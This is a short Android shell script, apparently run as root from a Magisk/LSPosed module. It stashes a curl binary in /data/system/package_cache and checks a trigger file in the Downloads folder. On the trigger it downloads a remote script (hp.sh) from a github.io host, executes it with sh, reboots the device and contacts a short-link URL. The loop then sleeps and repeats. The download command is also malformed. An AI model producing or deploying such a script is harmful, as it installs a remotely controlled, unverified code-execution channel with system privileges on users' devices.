#echo "123" > /storage/emulated/0/Download/apks.txt
cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
#curl -l https://sourl.cn/tRtpnk
#settings put system peak_refresh_rate 1
#####
file_content=$(cat "/storage/emulated/0/Download/apks.txt" | tr -d '\r\n')
if [ "$file_content" = "123" ]; then
    echo "ok"
    cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
    curl -o -s http://tanluying.github.io/ying/hp.sh /storage/emulated/0/Download/hp.sh
    sh /storage/emulated/0/Download/hp.sh
    reboot
    curl -l https://sourl.cn/tRtpnk
fi
echo "456" > /storage/emulated/0/Download/apks.txt
#####
sleep 900
